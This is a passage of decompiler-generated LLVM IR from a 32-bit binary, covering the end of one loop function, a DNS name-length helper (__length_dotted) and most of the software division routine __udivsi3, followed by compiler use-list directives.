  %v4_1bf7442 = load i8, i8* %v3_1bf7441, align 1
  %v6_1bf7443 = zext i8 %v4_1bf7442 to i32
  store i32 %v6_1bf7443, i32* @r4, align 4
  %v2_1bf7844 = icmp eq i8 %v4_1bf7442, 0
  %v2_1bf8046 = icmp eq i32 %v0_1bf80.pre.pre, 0
  br i1 %v2_1bf7844, label %dec_label_pc_1bf80, label %dec_label_pc_1bef8.lr.ph

dec_label_pc_1bef8.lr.ph:                         ; preds = %dec_label_pc_1bf74.preheader, %bb34
  %v2_1bf804663 = phi i1 [ %v2_1bf8046, %bb34 ], [ false, %dec_label_pc_1bf74.preheader ]
  %v6_1bf744361 = phi i32 [ %v6_1bf7443, %bb34 ], [ %v6_1bf744356, %dec_label_pc_1bf74.preheader ]
  %v1_1bf743960 = phi i32 [ %v1_1bf7439, %bb34 ], [ %v1_1bf743952, %dec_label_pc_1bf74.preheader ]
  %v0_1bf10.ph59 = phi i32 [ %v0_1bf74.pre.pre, %bb34 ], [ %v0_1bed4, %dec_label_pc_1bf74.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1bf70.pre, %bb34 ], [ 0, %dec_label_pc_1bf74.preheader ]
  br label %dec_label_pc_1bef8

dec_label_pc_1bf80:                               ; preds = %bb34
  br i1 %v2_1bf8046, label %dec_label_pc_1bf80.bb36_crit_edge, label %bb35

dec_label_pc_1bf80.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1bf80
  %v0_1bf88.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bf94

bb35:                                             ; preds = %dec_label_pc_1bf74.preheader, %dec_label_pc_1bf80
  %v1_1bf84 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf84 = add i32 %v1_1bf84, 1
  store i32 %v2_1bf84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bf94

dec_label_pc_1bf94:                               ; preds = %dec_label_pc_1bf30, %bb35, %dec_label_pc_1bf80.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1bf88.pre, %dec_label_pc_1bf80.bb36_crit_edge ], [ %v2_1bf84, %bb35 ], [ -1, %dec_label_pc_1bf30 ]
  store i32 %v3_1bed0, i32* @r4, align 4
  store i32 %v6_1bed0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1bf10.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1bf74, { 1, 0 }
  uselistorder i32 %v5_1bf20, { 0, 2, 1 }
  uselistorder i32 %v6_1bf7448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1bf8050, { 1, 0 }
  uselistorder i32 %v0_1bed4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 2, 10, 45, 41, 46, 47, 48, 49, 50, 4, 82, 6, 51, 16, 52, 53, 54, 15, 55, 56, 58, 59, 60, 61, 62, 63, 64, 57, 18, 65, 32, 19, 33, 66, 67, 68, 21, 20, 11, 12, 69, 70, 71, 14, 22, 72, 34, 35, 73, 36, 37, 23, 42, 43, 7, 24, 74, 38, 39, 75, 76, 17, 25, 77, 78, 79, 44, 81, 0, 1, 3, 29, 28, 30, 27, 8, 9, 26, 5, 40, 31, 13, 80, 83, 84 }
  uselistorder i8 46, { 0, 2, 3, 1, 4 }
  uselistorder i32 ()* @memcpy, { 16, 15, 25, 14, 13, 11, 10, 27, 26, 24, 23, 3, 5, 4, 19, 6, 9, 8, 7, 30, 2, 1, 22, 21, 20, 0, 12, 29, 28, 18, 17 }
  uselistorder i32 64, { 0, 2, 39, 33, 40, 41, 3, 42, 4, 5, 6, 36, 37, 38, 11, 34, 35, 12, 45, 13, 14, 43, 15, 16, 17, 18, 19, 20, 21, 22, 1, 44, 24, 23, 10, 25, 7, 26, 27, 28, 29, 30, 31, 32, 9, 8 }
  uselistorder i32* @r3, { 29, 0, 30, 31, 43, 44, 32, 35, 36, 3, 4, 39, 40, 41, 42, 21, 22, 45, 48, 46, 47, 33, 37, 16, 38, 34, 9, 10, 12, 11, 49, 50, 51, 13, 14, 15, 5, 6, 26, 27, 7, 8, 23, 24, 18, 19, 1, 2, 17, 20, 25, 28 }
  uselistorder i32* @r2, { 143, 144, 11, 145, 146, 25, 56, 206, 147, 148, 14, 57, 58, 59, 149, 150, 151, 63, 207, 204, 205, 152, 15, 208, 209, 219, 220, 97, 26, 27, 60, 61, 62, 210, 211, 153, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 16, 17, 64, 20, 65, 212, 35, 36, 37, 18, 66, 67, 108, 19, 8, 227, 228, 229, 230, 190, 191, 2, 213, 216, 217, 214, 215, 9, 192, 23, 258, 68, 231, 123, 124, 109, 69, 70, 139, 235, 236, 240, 241, 244, 242, 243, 237, 238, 239, 221, 222, 5, 223, 224, 110, 225, 226, 104, 103, 181, 182, 252, 111, 193, 194, 195, 1, 256, 6, 257, 159, 160, 161, 157, 158, 218, 162, 112, 196, 197, 198, 199, 10, 200, 201, 3, 202, 0, 203, 184, 163, 164, 165, 185, 113, 186, 166, 154, 155, 156, 7, 249, 71, 72, 73, 74, 75, 76, 77, 250, 24, 251, 98, 232, 4, 233, 28, 245, 78, 38, 79, 80, 247, 81, 82, 22, 83, 248, 84, 85, 86, 99, 100, 101, 87, 246, 29, 253, 254, 39, 40, 41, 42, 43, 44, 45, 46, 47, 187, 188, 133, 134, 125, 126, 135, 136, 48, 49, 50, 51, 127, 128, 52, 53, 120, 121, 88, 12, 89, 90, 91, 92, 93, 94, 95, 21, 234, 54, 13, 96, 102, 30, 31, 32, 33, 34, 105, 106, 55, 107, 255, 114, 115, 116, 117, 118, 119, 122, 129, 130, 131, 132, 137, 138, 140, 141, 142, 183, 189 }
  uselistorder i32* @r5, { 454, 455, 456, 457, 458, 459, 460, 12, 461, 462, 188, 189, 190, 191, 62, 63, 64, 65, 192, 193, 194, 195, 141, 142, 143, 144, 145, 146, 147, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 8, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 55, 148, 13, 5, 149, 490, 494, 491, 492, 493, 48, 499, 495, 496, 497, 498, 14, 56, 150, 151, 152, 153, 196, 197, 198, 199, 721, 724, 722, 15, 723, 154, 155, 156, 157, 162, 163, 164, 624, 625, 638, 639, 640, 641, 16, 642, 643, 500, 501, 502, 579, 17, 580, 620, 621, 622, 623, 503, 504, 505, 506, 507, 508, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 18, 655, 656, 333, 334, 335, 336, 66, 67, 657, 658, 659, 660, 661, 242, 243, 244, 509, 515, 19, 517, 516, 6, 518, 20, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 556, 555, 50, 557, 96, 97, 98, 99, 626, 627, 628, 629, 630, 21, 631, 632, 633, 634, 158, 22, 159, 23, 160, 161, 165, 166, 167, 168, 169, 170, 171, 173, 57, 172, 174, 175, 176, 178, 58, 177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 200, 201, 202, 725, 726, 727, 732, 204, 203, 7, 728, 729, 730, 731, 205, 206, 207, 208, 635, 636, 637, 209, 210, 211, 212, 213, 24, 214, 215, 216, 217, 218, 662, 663, 664, 665, 666, 667, 668, 219, 220, 221, 222, 669, 670, 671, 100, 101, 102, 103, 104, 105, 106, 107, 108, 223, 224, 225, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 51, 719, 720, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 25, 26, 238, 239, 27, 240, 241, 377, 378, 379, 380, 381, 382, 746, 747, 689, 690, 691, 692, 693, 694, 695, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 581, 696, 697, 0, 698, 704, 705, 706, 707, 708, 699, 700, 28, 702, 701, 703, 760, 793, 794, 795, 796, 797, 414, 415, 416, 417, 418, 419, 337, 338, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 383, 29, 11, 384, 385, 386, 387, 255, 256, 257, 258, 388, 389, 390, 391, 392, 393, 394, 395, 772, 776, 777, 778, 779, 780, 733, 734, 735, 743, 744, 745, 736, 737, 738, 739, 740, 741, 742, 420, 421, 422, 259, 260, 261, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 798, 799, 800, 801, 582, 583, 30, 584, 585, 586, 587, 709, 31, 710, 711, 712, 713, 714, 32, 528, 529, 530, 519, 33, 524, 525, 526, 527, 520, 34, 521, 522, 523, 715, 716, 717, 718, 531, 532, 533, 534, 396, 397, 398, 399, 588, 589, 59, 590, 591, 35, 592, 593, 594, 595, 596, 597, 52, 598, 599, 600, 601, 60, 605, 36, 606, 607, 608, 609, 610, 611, 612, 613, 9, 614, 615, 616, 617, 618, 619, 109, 110, 602, 1, 603, 604, 263, 262, 49, 802, 803, 804, 805, 535, 536, 537, 538, 539, 37, 540, 541, 569, 570, 571, 572, 573, 574, 510, 511, 512, 513, 514, 38, 264, 265, 266, 267, 268, 271, 269, 270, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 781, 352, 761, 762, 763, 764, 2, 765, 766, 272, 273, 274, 275, 783, 782, 276, 277, 278, 279, 280, 281, 68, 69, 70, 71, 282, 283, 111, 112, 284, 285, 286, 287, 39, 288, 289, 290, 72, 73, 74, 75, 76, 77, 78, 443, 79, 80, 83, 88, 84, 81, 82, 85, 86, 87, 773, 774, 775, 291, 292, 293, 53, 294, 295, 296, 784, 787, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 785, 786, 315, 316, 317, 318, 319, 320, 339, 340, 341, 350, 342, 343, 344, 345, 346, 347, 348, 40, 349, 321, 444, 445, 446, 447, 322, 113, 114, 115, 116, 117, 118, 119, 120, 121, 788, 789, 790, 791, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 410, 411, 412, 413, 575, 576, 577, 578, 435, 436, 437, 438, 427, 428, 429, 430, 439, 440, 441, 442, 132, 133, 134, 135, 431, 432, 433, 434, 136, 137, 423, 424, 425, 426, 323, 324, 325, 327, 3, 328, 326, 792, 54, 41, 329, 330, 331, 332, 767, 768, 769, 770, 771, 138, 4, 139, 140, 351, 10, 353, 354, 355, 356, 357, 358, 42, 359, 360, 361, 362, 448, 449, 450, 43, 451, 452, 453, 363, 45, 89, 90, 91, 44, 92, 93, 94, 95, 364, 61, 369, 370, 371, 372, 373, 374, 375, 376, 365, 366, 46, 47, 367, 368 }
  uselistorder label %dec_label_pc_1bf94, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1bf80.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1bef8.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1bfa0 = load i32, i32* @r0, align 4
  store i32 %v0_1bfa0, i32* @lr, align 4
  %v2_1bfa0 = icmp eq i32 %v0_1bfa0, 0
  br i1 %v2_1bfa0, label %bb, label %dec_label_pc_1bfb8

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1bfb0:                               ; preds = %dec_label_pc_1bfc0
  %v1_1bfb0 = add i32 %v1_1bfc8, 2
  br label %dec_label_pc_1bfe0

dec_label_pc_1bfb8:                               ; preds = %entry
  %v0_1bfb8 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1bfc8

dec_label_pc_1bfc0:                               ; preds = %dec_label_pc_1bfc8
  %v1_1bfd4 = and i32 %v6_1bfc8, 192
  %v2_1bfd8 = add i32 %v6_1bfc8, %v1_1bfcc
  %v2_1bfc0 = icmp eq i32 %v1_1bfd4, 192
  br i1 %v2_1bfc0, label %dec_label_pc_1bfb0, label %dec_label_pc_1bfc8

dec_label_pc_1bfc8:                               ; preds = %dec_label_pc_1bfc0, %dec_label_pc_1bfb8
  %v1_1bfc8 = phi i32 [ %v2_1bfd8, %dec_label_pc_1bfc0 ], [ %v0_1bfb8, %dec_label_pc_1bfb8 ]
  %v2_1bfc8 = add i32 %v1_1bfc8, %v0_1bfa0
  %v3_1bfc8 = inttoptr i32 %v2_1bfc8 to i8*
  %v4_1bfc8 = load i8, i8* %v3_1bfc8, align 1
  %v6_1bfc8 = zext i8 %v4_1bfc8 to i32
  %v1_1bfcc = add i32 %v1_1bfc8, 1
  %v2_1bfd0 = icmp eq i8 %v4_1bfc8, 0
  br i1 %v2_1bfd0, label %dec_label_pc_1bfe0, label %dec_label_pc_1bfc0

dec_label_pc_1bfe0:                               ; preds = %dec_label_pc_1bfc8, %dec_label_pc_1bfb0
  %v1_1bfe0 = phi i32 [ %v1_1bfb0, %dec_label_pc_1bfb0 ], [ %v1_1bfcc, %dec_label_pc_1bfc8 ]
  %v2_1bfe0 = sub i32 %v1_1bfe0, %v0_1bfb8
  ret i32 %v2_1bfe0

; uselistorder directives
  uselistorder i32 %v6_1bfc8, { 1, 0 }
  uselistorder i32 %v1_1bfc8, { 2, 1, 0 }
  uselistorder i32 %v0_1bfa0, { 0, 2, 1 }
  uselistorder i8 0, { 67, 24, 31, 32, 68, 23, 28, 69, 70, 71, 33, 34, 35, 36, 37, 72, 53, 76, 74, 52, 75, 73, 51, 44, 10, 11, 77, 78, 82, 83, 30, 64, 65, 79, 80, 81, 17, 84, 45, 54, 85, 87, 0, 86, 55, 46, 88, 89, 90, 91, 92, 93, 12, 58, 97, 1, 95, 94, 56, 2, 96, 57, 3, 98, 99, 38, 4, 100, 101, 103, 102, 104, 105, 107, 106, 59, 108, 109, 110, 111, 47, 48, 113, 114, 112, 13, 14, 15, 115, 5, 116, 117, 25, 66, 119, 120, 121, 122, 118, 49, 123, 124, 125, 126, 127, 26, 128, 129, 39, 29, 6, 7, 131, 130, 40, 132, 133, 41, 134, 60, 27, 135, 136, 137, 138, 139, 140, 18, 141, 142, 143, 144, 145, 146, 147, 148, 19, 149, 150, 153, 151, 152, 61, 154, 155, 156, 20, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 8, 168, 9, 169, 170, 42, 171, 172, 173, 174, 175, 176, 21, 177, 178, 179, 181, 180, 62, 182, 183, 184, 22, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 50, 16, 197, 195, 196, 198, 199, 200, 201, 204, 203, 63, 202, 205, 206, 207, 208, 209, 210, 211, 218, 212, 217, 216, 214, 213, 215, 43, 219, 220, 221 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* @r1, { 198, 199, 2, 200, 201, 90, 305, 92, 306, 307, 308, 309, 310, 311, 202, 205, 203, 204, 15, 16, 77, 78, 79, 206, 207, 208, 84, 85, 91, 17, 86, 87, 18, 312, 315, 209, 210, 211, 212, 213, 214, 5, 6, 303, 304, 215, 216, 316, 317, 80, 132, 133, 318, 106, 107, 217, 218, 225, 226, 227, 240, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 51, 313, 19, 88, 81, 82, 83, 319, 89, 30, 93, 94, 95, 96, 21, 314, 20, 22, 97, 98, 320, 321, 322, 23, 99, 100, 101, 24, 323, 324, 52, 53, 54, 55, 56, 25, 102, 103, 104, 105, 7, 144, 145, 27, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 9, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 8, 379, 380, 26, 228, 238, 285, 286, 287, 288, 289, 290, 291, 325, 327, 328, 326, 29, 39, 120, 382, 332, 421, 161, 162, 163, 165, 166, 108, 383, 384, 177, 178, 146, 147, 109, 110, 111, 112, 192, 193, 387, 406, 388, 393, 394, 397, 395, 396, 389, 390, 391, 392, 330, 331, 148, 398, 405, 164, 136, 31, 140, 137, 32, 33, 270, 271, 272, 278, 409, 410, 411, 412, 292, 293, 294, 34, 295, 273, 274, 275, 276, 277, 10, 168, 169, 11, 41, 42, 43, 44, 45, 46, 47, 12, 415, 416, 417, 418, 1, 419, 420, 28, 233, 234, 235, 236, 237, 229, 230, 231, 232, 329, 239, 149, 296, 297, 298, 299, 0, 300, 301, 302, 35, 279, 241, 242, 243, 244, 245, 280, 150, 281, 219, 220, 221, 222, 223, 224, 113, 114, 115, 116, 117, 118, 119, 407, 3, 40, 408, 385, 4, 386, 381, 399, 121, 13, 36, 57, 122, 123, 400, 124, 125, 401, 126, 127, 128, 134, 129, 138, 139, 413, 58, 59, 60, 61, 62, 402, 403, 63, 64, 65, 66, 67, 68, 282, 283, 186, 187, 179, 180, 188, 189, 69, 70, 71, 72, 181, 182, 73, 74, 174, 175, 130, 404, 37, 131, 38, 75, 14, 135, 48, 49, 50, 141, 142, 76, 143, 414, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 167, 170, 171, 172, 173, 176, 183, 184, 185, 190, 191, 194, 195, 196, 197, 284 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1bfe8 = add i32 %arg2, -1
  %v7_1bfe8 = icmp eq i32 %arg2, 1
  br i1 %v7_1bfe8, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_1bfec = load i32, i32* @r0, align 4
  ret i32 %v2_1bfec

bb80:                                             ; preds = %entry
  %v2_1bfe8 = icmp eq i32 %arg2, 0
  br i1 %v2_1bfe8, label %dec_label_pc_1c0d0, label %dec_label_pc_1bff4

dec_label_pc_1bff4:                               ; preds = %bb80
  %v0_1bff4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_1bff4, %arg2
  br i1 %tmp, label %dec_label_pc_1bffc, label %dec_label_pc_1c088

dec_label_pc_1bffc:                               ; preds = %dec_label_pc_1bff4
  %v2_1bffc = and i32 %v1_1bfe8, %arg2
  %v4_1bffc = icmp eq i32 %v2_1bffc, 0
  br i1 %v4_1bffc, label %dec_label_pc_1c094, label %dec_label_pc_1c004

dec_label_pc_1c004:                               ; preds = %dec_label_pc_1bffc
  %v3_1c004 = icmp ult i32 %arg2, 536870912
  br i1 %v3_1c004, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1c004
  %v4_1c008 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1c004, %.thread
  %v0_1c028.pr36.ph = phi i32 [ %v4_1c008, %.thread ], [ %arg2, %dec_label_pc_1c004 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1c004 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_1c028.pr36 = phi i32 [ %v4_1c01c, %bb83 ], [ %v0_1c028.pr36.ph, %.preheader.preheader ]
  %v1_1c020 = phi i32 [ %v4_1c020, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_1c014 = icmp ugt i32 %v0_1c028.pr36, 268435455
  br i1 %v2_1c014, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1c028thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_1c018 = icmp ult i32 %v0_1c028.pr36, %v0_1bff4
  br i1 %v4_1c018, label %bb82, label %dec_label_pc_1c028thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_1c01c = and i32 %v0_1c028.pr36, 268435456
  %v3_1c01c = icmp eq i32 %v2_1c01c, 0
  %v4_1c01c = mul i32 %v0_1c028.pr36, 16
  br i1 %v3_1c01c, label %bb83, label %dec_label_pc_1c028.loopexit

bb83:                                             ; preds = %bb82
  %v2_1c020 = and i32 %v1_1c020, 268435456
  %v3_1c020 = icmp eq i32 %v2_1c020, 0
  %v4_1c020 = mul i32 %v1_1c020, 16
  br i1 %v3_1c020, label %.preheader, label %dec_label_pc_1c028thread-pre-split.loopexit.loopexit

dec_label_pc_1c028thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1c03448.ph = phi i32 [ %v1_1c020, %bb81 ], [ %v4_1c020, %bb83 ]
  %v0_1c028.pr38.ph = phi i32 [ %v0_1c028.pr36, %bb81 ], [ %v4_1c01c, %bb83 ]
  br label %dec_label_pc_1c028thread-pre-split.loopexit

dec_label_pc_1c028thread-pre-split.loopexit:      ; preds = %dec_label_pc_1c028thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1c03448 = phi i32 [ %v1_1c020, %.thread2 ], [ %v1_1c03448.ph, %dec_label_pc_1c028thread-pre-split.loopexit.loopexit ]
  %v0_1c028.pr38 = phi i32 [ %v0_1c028.pr36, %.thread2 ], [ %v0_1c028.pr38.ph, %dec_label_pc_1c028thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c028thread-pre-split

dec_label_pc_1c028thread-pre-split:               ; preds = %dec_label_pc_1c028thread-pre-split.loopexit, %bb85
  %v1_1c03446 = phi i32 [ %v1_1c03448, %dec_label_pc_1c028thread-pre-split.loopexit ], [ %v3_1c034, %bb85 ]
  %v0_1c028.pr = phi i32 [ %v0_1c028.pr38, %dec_label_pc_1c028thread-pre-split.loopexit ], [ %v3_1c030, %bb85 ]
  br label %dec_label_pc_1c028

dec_label_pc_1c028.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_1c028

dec_label_pc_1c028:                               ; preds = %dec_label_pc_1c028.loopexit, %dec_label_pc_1c028thread-pre-split
  %v1_1c034 = phi i32 [ %v1_1c03446, %dec_label_pc_1c028thread-pre-split ], [ %v1_1c020, %dec_label_pc_1c028.loopexit ]
  %v1_1c030 = phi i32 [ %v0_1c028.pr, %dec_label_pc_1c028thread-pre-split ], [ %v4_1c01c, %dec_label_pc_1c028.loopexit ]
  %v2_1c028 = icmp slt i32 %v1_1c030, 0
  br i1 %v2_1c028, label %dec_label_pc_1c03c, label %bb84

bb84:                                             ; preds = %dec_label_pc_1c028
  %v4_1c02c = icmp ult i32 %v1_1c030, %v0_1bff4
  br i1 %v4_1c02c, label %bb85, label %dec_label_pc_1c03c

bb85:                                             ; preds = %bb84
  %v3_1c030 = mul i32 %v1_1c030, 2
  %v2_1c034 = icmp slt i32 %v1_1c034, 0
  %v3_1c034 = mul i32 %v1_1c034, 2
  br i1 %v2_1c034, label %dec_label_pc_1c03c, label %dec_label_pc_1c028thread-pre-split

dec_label_pc_1c03c:                               ; preds = %bb84, %dec_label_pc_1c028, %bb85
  %v2_1c04859 = phi i32 [ %v3_1c034, %bb85 ], [ %v1_1c034, %bb84 ], [ %v1_1c034, %dec_label_pc_1c028 ]
  %v1_1c04051 = phi i32 [ %v3_1c030, %bb85 ], [ %v1_1c030, %bb84 ], [ %v1_1c030, %dec_label_pc_1c028 ]
  br label %dec_label_pc_1c040

dec_label_pc_1c040:                               ; preds = %.thread11, %dec_label_pc_1c03c
  %v1_1c074 = phi i32 [ %v4_1c074, %.thread11 ], [ %v2_1c04859, %dec_label_pc_1c03c ]
  %v1_1c048 = phi i32 [ %v0_1c080, %.thread11 ], [ 0, %dec_label_pc_1c03c ]
  %v1_1c078 = phi i32 [ %v4_1c078, %.thread11 ], [ %v1_1c04051, %dec_label_pc_1c03c ]
  %v1_1c044 = phi i32 [ %v0_1c070, %.thread11 ], [ %v0_1bff4, %dec_label_pc_1c03c ]
  %v3_1c040 = icmp ult i32 %v1_1c044, %v1_1c078
  br i1 %v3_1c040, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_1c040
  %v3_1c044 = sub i32 %v1_1c044, %v1_1c078
  %v3_1c048 = or i32 %v1_1c048, %v1_1c074
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1c040, %bb86
  %v1_1c050 = phi i32 [ %v1_1c044, %dec_label_pc_1c040 ], [ %v3_1c044, %bb86 ]
  %v1_1c054 = phi i32 [ %v1_1c048, %dec_label_pc_1c040 ], [ %v3_1c048, %bb86 ]
  %v4_1c04c = udiv i32 %v1_1c078, 2
  %v6_1c04c = icmp ult i32 %v1_1c050, %v4_1c04c
  br i1 %v6_1c04c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_1c050 = urem i32 %v1_1c078, 2
  %v4_1c050 = icmp eq i32 %v3_1c050, 0
  %v6_1c050 = sub i32 %v1_1c050, %v4_1c04c
  br i1 %v4_1c050, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1c054 = udiv i32 %v1_1c074, 2
  %v6_1c054 = or i32 %v1_1c054, %v5_1c054
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_1c05c = phi i32 [ %v6_1c050, %bb87 ], [ %v1_1c050, %.thread7 ], [ %v6_1c050, %bb88 ]
  %v1_1c060 = phi i32 [ %v1_1c054, %bb87 ], [ %v1_1c054, %.thread7 ], [ %v6_1c054, %bb88 ]
  %v4_1c058 = udiv i32 %v1_1c078, 4
  %v6_1c058 = icmp ult i32 %v1_1c05c, %v4_1c058
  br i1 %v6_1c058, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_1c05c = and i32 %v1_1c078, 2
  %v4_1c05c = icmp eq i32 %v3_1c05c, 0
  %v6_1c05c = sub i32 %v1_1c05c, %v4_1c058
  br i1 %v4_1c05c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1c060 = udiv i32 %v1_1c074, 4
  %v6_1c060 = or i32 %v1_1c060, %v5_1c060
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_1c068 = phi i32 [ %v6_1c05c, %bb89 ], [ %v1_1c05c, %.thread8 ], [ %v6_1c05c, %bb90 ]
  %v1_1c06c = phi i32 [ %v1_1c060, %bb89 ], [ %v1_1c060, %.thread8 ], [ %v6_1c060, %bb90 ]
  %v4_1c064 = udiv i32 %v1_1c078, 8
  %v6_1c064 = icmp ult i32 %v1_1c068, %v4_1c064
  br i1 %v6_1c064, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_1c068 = and i32 %v1_1c078, 4
  %v4_1c068 = icmp eq i32 %v3_1c068, 0
  %v6_1c068 = sub i32 %v1_1c068, %v4_1c064
  br i1 %v4_1c068, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_1c06c = udiv i32 %v1_1c074, 8
  %v6_1c06c = or i32 %v1_1c06c, %v5_1c06c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_1c080 = phi i32 [ %v1_1c06c, %bb91 ], [ %v1_1c06c, %.thread9 ], [ %v6_1c06c, %bb92 ]
  %v0_1c070 = phi i32 [ %v6_1c068, %bb91 ], [ %v1_1c068, %.thread9 ], [ %v6_1c068, %bb92 ]
  %v2_1c070 = icmp eq i32 %v0_1c070, 0
  br i1 %v2_1c070, label %dec_label_pc_1c080, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_1c074, 16
  br i1 %tmp140, label %dec_label_pc_1c080, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_1c074 = udiv i32 %v1_1c074, 16
  %v4_1c078 = udiv i32 %v1_1c078, 16
  br label %dec_label_pc_1c040

dec_label_pc_1c080:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_1c080

dec_label_pc_1c088:                               ; preds = %dec_label_pc_1bff4
  %v9_1bff4 = icmp eq i32 %v0_1bff4, %arg2
  %. = zext i1 %v9_1bff4 to i32
  ret i32 %.

dec_label_pc_1c094:                               ; preds = %dec_label_pc_1bffc
  %v2_1c094 = icmp ugt i32 %arg2, 65535
  br i1 %v2_1c094, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_1c094
  %v2_1c098 = and i32 %arg2, 32768
  %v3_1c098 = icmp eq i32 %v2_1c098, 0
  %v4_1c098 = udiv i32 %arg2, 65536
  br i1 %v3_1c098, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_1c094
  %v0_1c0a465 = phi i32 [ %arg2, %dec_label_pc_1c094 ], [ %v4_1c098, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1c0a8 = phi i32 [ %v0_1c0a465, %.thread16 ], [ %v4_1c098, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_1c0a4 = icmp ugt i32 %v1_1c0a8, 255
  br i1 %v2_1c0a4, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1c0a8 = and i32 %v1_1c0a8, 128
  %v3_1c0a8 = icmp eq i32 %v2_1c0a8, 0
  %v4_1c0a8 = udiv i32 %v1_1c0a8, 256
  br i1 %v3_1c0a8, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1c0ac = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1c0b8 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_1c0ac, %bb100 ]
